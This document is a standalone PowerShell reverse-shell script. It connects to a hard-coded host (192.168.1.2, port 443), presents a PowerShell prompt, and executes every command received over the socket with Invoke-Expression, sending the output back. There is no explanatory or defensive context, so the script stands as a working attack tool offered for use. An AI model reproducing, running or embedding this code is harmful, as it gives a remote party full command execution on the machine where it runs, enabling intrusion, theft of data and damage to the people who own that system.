$ip = '192.168.1.2'
$port = 443
$client = New-Object System.Net.Sockets.TCPClient($ip, $port)
$stream = $client.GetStream()
$enc = [system.Text.Encoding]::ASCII
[byte[]]$buffer = 0..65535|%{0}

$sendback = ''
while ($true) {
  $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
  $sendbyte = $enc.GetBytes($sendback2)
  $stream.Write($sendbyte,0,$sendbyte.Length)
  $stream.Flush()
  $i = $stream.Read($buffer, 0, $buffer.Length)
  if ($i -eq 0) { exit }
  $data = $enc.GetString($buffer,0, $i)
  $sendback = ((iex $data) 2>&1 | Out-String )
}
$client.Close()